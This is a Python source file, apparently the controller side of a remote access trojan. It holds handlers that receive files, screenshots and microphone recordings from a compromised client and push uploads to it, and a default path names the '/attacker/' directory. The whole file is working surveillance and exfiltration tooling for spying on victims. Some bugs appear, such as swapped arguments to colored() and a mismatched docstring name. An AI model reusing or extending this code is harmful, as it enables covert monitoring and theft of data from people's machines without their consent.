from socket_handlers import socket_recv, socket_send
from termcolor import colored
import os, ast, base64, binascii
from datetime import datetime


def handle_download(client_socket, command) -> bool:
    """
    Handles file download from a client socket.

    Args:
        client_socket: The socket connection to receive data from.
        command: The download command string (may contain optional file path).

    Returns:
        bool: True if download was successful, False otherwise.

    Process:
        1. Receives initial file info data from the socket
        2. Validates the file information (name and size)
        3. Uses the provided path from command or defaults to the sent filename
        4. Receives file data in chunks and writes to disk
        5. Verifies the final file size matches the expected size
        6. Cleans up partial files if any errors occur

    Error Handling:
        - Prints colored error messages for various failure cases
        - Removes partially downloaded files on failure
        - Handles permission errors, size mismatches, and network issues

    Example:
        Successful download prints: "[+] File 'example.txt' downloaded (1.23MB)"
        Failed download prints error messages in red.
    """
    try:
        # Receive initial file info data from the socket
        file_info_data = socket_recv(client_socket)

        # Check if server returned an error message
        if file_info_data.startswith("Error"):
            print(colored(file_info_data, "red"))
            return False

        try:
            # Parse the file information (name and size) sent by the server
            file_info = ast.literal_eval(socket_recv(client_socket))

            # Validate the file info structure
            if (
                not isinstance(file_info, dict)
                or "name" not in file_info
                or "size" not in file_info
            ):
                raise ValueError("Invalid file info format")

        except Exception as e:
            print(colored(f"[!] Error decoding file info: {str(e)}", "red"))
            return False

        # Use either the path from command or default to the sent filename
        file_path = command[9:].strip() or file_info["name"]

        try:
            # Open file in binary write mode to save downloaded data
            with open(file_path, "wb") as fp:
                received_bytes = 0

                # Receive file data in chunks until complete
                while received_bytes < file_info["size"]:
                    chunk_data = socket_recv(client_socket)

                    # Check for transfer errors or completion message
                    if (
                        chunk_data.startswith("Error")
                        or chunk_data == "[+] File Transfer Complete"
                    ):
                        break

                    # Write received data to file
                    fp.write(chunk_data)
                    received_bytes += len(chunk_data)

            # Verify downloaded file size matches expected size
            if os.path.getsize(file_path) != file_info["size"]:
                os.remove(file_path)  # Remove corrupted/incomplete file
                error_msg = "Error: File size mismatch"
                print(colored(error_msg, "red"))
                return False

            # Success message with file size in MB
            print(
                colored(
                    f"[+] File '{file_path}' downloaded ({file_info['size']/1024/1024:.2f}MB)",
                    "green",
                )
            )
            return True

        # Handle specific error cases
        except PermissionError:
            error_msg = "Error: Permission denied"
        except Exception as e:
            error_msg = f"Error: {str(e)}"
            # Cleanup partial download if exists
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except:
                pass  # Ignore cleanup errors

        print(colored(error_msg, "red"))
        return False

    except Exception as e:
        # Catch-all for any unexpected errors
        print(colored(f"Download failed: {e}", "red"))
        return False


def handle_upload(client_socket, command) -> bool:
    """
    Handle file upload operation from server to client with comprehensive error handling.

    This function reads the specified file from the server, encodes it in base64,
    and sends it to the client. It performs various validations and provides detailed
    error feedback to both client and server.

    Parameters:
        client_socket (socket.socket): The socket object connected to the client
        command (str): The full upload command string (e.g., "upload /path/to/file")

    Returns:
        bool:
            - True if file was successfully read and sent to client
            - False if any error occurred during the process

    Raises:
        This function catches all exceptions internally and converts them to error messages,
        so it doesn't raise any exceptions to the caller.

    Examples:
        >>> # In server's command handling loop:
        >>> if command.startswith("upload"):
        >>>     if not handle_upload(client_socket, command):
        >>>         continue  # Skip further processing if upload failed
        >>>     # Continue with other operations

    Notes:
        - The function expects the file data to be small enough to be read into memory at once
        - Uses base64 encoding for reliable binary data transfer
        - Includes security checks against path traversal attempts
        - Provides detailed error messages to both client and server
    """
    try:
        # Safely extract file path from command
        file_path = command[7:].strip()
        if not file_path:
            print(colored("Error: No file path specified", "red"))
            return False

        # Basic security check for file path
        if any(char in file_path for char in ["..", "~"]) or not os.path.basename(
            file_path
        ):
            print(colored("Error: Invalid file path", "red"))
            return False

        # Check if file exists
        if not os.path.exists(file_path):
            print(colored(f"Error: File {file_path} not found", "red"))
            return False

        # Read and send file data
        try:
            with open(file_path, "rb") as fp:
                file_data = fp.read()
                socket_send(client_socket, base64.b64encode(file_data))

            # Wait for client response
            client_response = socket_recv(client_socket)
            if client_response.startswith("Error"):
                print(colored(client_response, "red"))
                return False
            else:
                print(colored(client_response, "green"))
                return True

        # Handling IO errors
        except IOError as e:
            error_msg = f"Error: Failed to read file - {str(e)}"
            print(colored(error_msg, "red"))
            return False

    # Handling other errors
    except Exception as e:
        error_msg = f"Error: Unexpected error during upload - {str(e)}"
        print(colored(error_msg, "red"))
        return False


def handle_screenshot(client_socket, save_path="screenshot.png"):
    """
    Handle screenshot reception from client with comprehensive error handling.

    This function receives screenshot data from the client, decodes it from base64,
    and saves it to the specified file path. It provides detailed error feedback
    and validation.

    Parameters:
        client_socket (socket.socket): The socket object connected to the client
        save_path (str): Path to save the received screenshot (default: "screenshot.png")

    Returns:
        bool:
            - True if screenshot was successfully received and saved
            - False if any error occurred during the process

    Examples:
        >>> # In server's command handling loop:
        >>> if command == "prt_screen":
        >>>     if not handle_screenshot(client_socket):
        >>>         continue  # Skip further processing if failed
        >>>     # Continue with other operations
    """
    try:
        # Receive screenshot data from client
        data = socket_recv(client_socket)

        # Check for error messages from client
        if data.startswith("[!] Error"):
            print(colored(data, "red"))
            return False

        if not data:
            error_msg = "[!] Error: Received empty screenshot data"
            print(colored(error_msg, "red"))
            return False

        try:
            # Decode and save the screenshot
            decoded_data = base64.b64decode(data)

            # Create directory if needed
            os.makedirs(os.path.dirname(save_path), exist_ok=True)

            # Write file with validation
            with open(save_path, "wb") as fp:
                fp.write(decoded_data)
                fp.close()

            # Verify file was written correctly
            if os.path.getsize(save_path) == len(decoded_data):
                print(colored(f"Screenshot successfully saved to {save_path}", "green"))
                return True
            else:
                error_msg = "[!] Error: Screenshot file size mismatch after save"
                print(colored(error_msg, "red"))
                os.remove(save_path)  # Clean up corrupted file
                return False

        #  Handle binascii and IO errors
        except binascii.Error:
            error_msg = "[!] Error: Invalid base64 data received"
            print(colored(error_msg, "red"))
            return False
        except IOError as e:
            error_msg = f"[!] Error: Failed to save screenshot - {str(e)}"
            print(colored(error_msg, "red"))
            if os.path.exists(save_path):
                os.remove(save_path)  # Clean up partial file
            return False

    # Handle other errors
    except Exception as e:
        error_msg = f"[!] Error: Unexpected error during screenshot handling - {str(e)}"
        print(colored(error_msg, "red"))
        return False


def save_audio(socket, save_dir="/attacker/audio_recordings/"):
    """
    Receives audio data from client and saves it permanently to specified directory.
    
    Args:
        connection: The socket connection object
        save_dir (str): Directory to save audio files (default: '/attacker/audio_recordings/')
    
    Returns:
        str: Path to saved file if successful, None if failed
    
    Example:
        >>> file_path = receive_and_save_audio(client_socket)
    """
    try:
        # Create directory if it doesn't exist
        os.makedirs(save_dir, exist_ok=True)
        
        # Generate unique filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"recording_{timestamp}.wav"
        filepath = os.path.join(save_dir, filename)
        
        # Receive audio data using your socket_recv function
        audio_data = socket_recv(socket)
        
        if not audio_data:
            print(colored("red", "[!] Error: No audio data received"))
            return False
            
        # Validate it's WAV data (basic check)
        if len(audio_data) < 44 or not audio_data.startswith(b'RIFF'):
            print(colored("red", "[!] Error: Invalid WAV file data received"))
            return False
            
        # Save to permanent storage
        with open(filepath, 'wb') as fp:
            fp.write(audio_data)
            fp.close()

        print(colored("green", f"[+] Audio successfully saved to: {filepath}"))
        return filepath
        
    except Exception as e:
        print(colored("red", f"[!] Error saving audio: {str(e)}"))
        return False
